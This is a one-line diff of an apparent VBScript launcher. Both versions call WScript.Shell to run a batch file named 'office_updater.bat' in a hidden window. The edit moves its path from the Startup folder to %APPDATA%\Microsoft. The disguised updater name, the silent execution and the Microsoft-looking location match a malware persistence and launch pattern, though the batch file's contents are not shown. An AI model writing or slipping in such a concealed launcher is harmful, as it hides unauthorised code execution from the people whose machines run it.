@@ -1,1 +1,1 @@
-CreateObject("Wscript.Shell").Run "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\office_updater.bat", 0, True
+CreateObject("Wscript.Shell").Run "%APPDATA%\Microsoft\office_updater.bat", 0, True
